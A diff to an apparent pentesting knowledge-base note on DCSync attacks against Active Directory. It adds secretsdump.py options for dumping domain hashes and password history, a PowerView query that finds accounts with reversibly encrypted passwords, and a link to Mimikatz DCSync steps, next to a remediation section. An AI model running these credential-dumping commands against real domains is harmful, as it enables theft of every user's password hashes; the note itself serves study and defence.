@@ -119,8 +119,20 @@ This will then show us all the replication permissions for that user. We are loo
 ```bash
 secretsdump.py -outputfile hashes -just-dc [domain]/[user]@[dc-ip]
 ```
-> `-just-dc-ntlm` will give us only ntlm hashes, as opposed to also giving kerberos keys too
-> ``
+> `-just-dc-ntlm` will give us only NTLM hashes, as opposed to also giving kerberos keys too
+> `-just-dc-user` will only give data on a specific user
+> `-pwd-last-set` will show when each account last reset its password
+> `-history` will dump out the entire password history
+> `-user-status` can be used to later filter out all disabled users
+
+Occasionally, we may get a file containing cleartext passwords. This will be from any users that have the account option to store their password with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Even if this setting is disabled, a new password will need to be set. We can check for the `ENCRYPTED_TEXT_PWD_ALLOWED` useraccountcontrol:
+```PowerShell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
+```
+
+### Using [[Mimikatz]]
+![[Mimikatz#Abusing ACLs DCSync DCSync]]
+
 
 ## Remediation and Detection
 ### Regular auditing for dangerous ACLs
